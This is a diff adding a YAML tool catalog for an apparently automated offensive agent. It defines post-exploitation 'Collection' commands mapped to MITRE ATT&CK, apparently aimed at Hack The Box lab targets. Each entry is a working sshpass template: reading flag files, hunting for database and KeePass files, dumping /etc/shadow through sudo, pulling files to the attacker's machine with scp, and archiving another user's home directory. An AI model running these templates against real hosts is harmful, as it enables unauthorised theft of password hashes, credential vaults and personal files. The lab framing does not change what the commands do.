@@ -1,0 +1,128 @@
+# Collection (TA0009): gathering artifacts of value from compromised hosts.
+
+tools:
+  - name: ssh_cat_user_flag
+    category: post-exploit
+    description: Read /home/<user>/user.txt via SSH (HTB convention).
+    command_template: "sshpass -p {password} ssh -o StrictHostKeyChecking=no {user}@{ip} -p {port} 'cat /home/{user}/user.txt 2>/dev/null'"
+    slots:
+      - { name: ip, type: ip, description: target host }
+      - { name: port, type: port, description: SSH port, default: 22 }
+      - { name: user, type: free_string, description: SSH user }
+      - { name: password, type: free_string, description: SSH password }
+    runtime_cap_seconds: 15
+    output_parser_id: raw
+    attack:
+      matrices: [enterprise]
+      tactics: [TA0009]
+      techniques: [T1005]
+    example_invocation: { ip: 10.10.10.5, port: 22, user: bob, password: hunter2 }
+    example_output: "ab12cd34ef5678901234567890abcdef"
+
+  - name: ssh_cat_root_flag
+    category: post-exploit
+    description: Read /root/root.txt as root (HTB convention).
+    command_template: "sshpass -p {password} ssh -o StrictHostKeyChecking=no {user}@{ip} -p {port} 'sudo -n cat /root/root.txt 2>/dev/null'"
+    slots:
+      - { name: ip, type: ip, description: target host }
+      - { name: port, type: port, description: SSH port, default: 22 }
+      - { name: user, type: free_string, description: SSH user (must have NOPASSWD sudo) }
+      - { name: password, type: free_string, description: SSH password }
+    runtime_cap_seconds: 15
+    output_parser_id: raw
+    attack:
+      matrices: [enterprise]
+      tactics: [TA0009]
+      techniques: [T1005]
+    example_invocation: { ip: 10.10.10.5, port: 22, user: bob, password: hunter2 }
+    example_output: "ff00112233445566778899aabbccddee"
+
+  - name: find_database_files
+    category: post-exploit
+    description: Find common database file extensions on the target.
+    command_template: "sshpass -p {password} ssh -o StrictHostKeyChecking=no {user}@{ip} -p {port} 'find / -type f \\( -name \"*.db\" -o -name \"*.sqlite\" -o -name \"*.kdbx\" -o -name \"*.bak\" \\) 2>/dev/null'"
+    slots:
+      - { name: ip, type: ip, description: target host }
+      - { name: port, type: port, description: SSH port, default: 22 }
+      - { name: user, type: free_string, description: SSH user }
+      - { name: password, type: free_string, description: SSH password }
+    runtime_cap_seconds: 60
+    output_parser_id: lines
+    attack:
+      matrices: [enterprise]
+      tactics: [TA0009, TA0007]
+      techniques: [T1083, T1005]
+    example_invocation: { ip: 10.10.10.5, port: 22, user: bob, password: hunter2 }
+    example_output: |
+      /var/www/app.sqlite
+      /home/bob/passwords.kdbx
+
+  - name: read_etc_shadow
+    category: post-exploit
+    description: Read /etc/shadow as root.
+    command_template: "sshpass -p {password} ssh -o StrictHostKeyChecking=no {user}@{ip} -p {port} 'sudo -n cat /etc/shadow 2>/dev/null'"
+    slots:
+      - { name: ip, type: ip, description: target host }
+      - { name: port, type: port, description: SSH port, default: 22 }
+      - { name: user, type: free_string, description: SSH user with NOPASSWD sudo }
+      - { name: password, type: free_string, description: SSH password }
+    runtime_cap_seconds: 15
+    output_parser_id: lines
+    attack:
+      matrices: [enterprise]
+      tactics: [TA0006, TA0009]
+      techniques: [T1003.008]
+    example_invocation: { ip: 10.10.10.5, port: 22, user: bob, password: hunter2 }
+    example_output: |
+      root:$6$abc...:19000:0:99999:7:::
+
+  - name: scp_pull_file
+    category: post-exploit
+    description: Copy a single file from the target back to Kali.
+    command_template: "sshpass -p {password} scp -o StrictHostKeyChecking=no -P {port} {user}@{ip}:{remote_path} {local_path}"
+    slots:
+      - { name: ip, type: ip, description: target host }
+      - { name: port, type: port, description: SSH port, default: 22 }
+      - { name: user, type: free_string, description: SSH user }
+      - { name: password, type: free_string, description: SSH password }
+      - { name: remote_path, type: file_path, description: file on target }
+      - { name: local_path, type: file_path, description: destination on Kali, default: /tmp/loot }
+    runtime_cap_seconds: 120
+    output_parser_id: raw
+    attack:
+      matrices: [enterprise]
+      tactics: [TA0009]
+      techniques: [T1005]
+    example_invocation:
+      ip: 10.10.10.5
+      port: 22
+      user: bob
+      password: hunter2
+      remote_path: /home/bob/notes.txt
+      local_path: /tmp/loot/notes.txt
+    example_output: ""
+
+  - name: zip_home_directory
+    category: post-exploit
+    description: Tar+gzip a target home directory and write it to /tmp.
+    command_template: "sshpass -p {password} ssh -o StrictHostKeyChecking=no {user}@{ip} -p {port} 'tar czf /tmp/home-{target_user}.tgz /home/{target_user} 2>/dev/null && ls -l /tmp/home-{target_user}.tgz'"
+    slots:
+      - { name: ip, type: ip, description: target host }
+      - { name: port, type: port, description: SSH port, default: 22 }
+      - { name: user, type: free_string, description: SSH user with read access }
+      - { name: password, type: free_string, description: SSH password }
+      - { name: target_user, type: free_string, description: home dir owner to archive }
+    runtime_cap_seconds: 300
+    output_parser_id: lines
+    attack:
+      matrices: [enterprise]
+      tactics: [TA0009]
+      techniques: [T1560.001, T1005]
+    example_invocation:
+      ip: 10.10.10.5
+      port: 22
+      user: bob
+      password: hunter2
+      target_user: alice
+    example_output: |
+      -rw-r--r-- 1 bob bob 124908 May 5 12:34 /tmp/home-alice.tgz
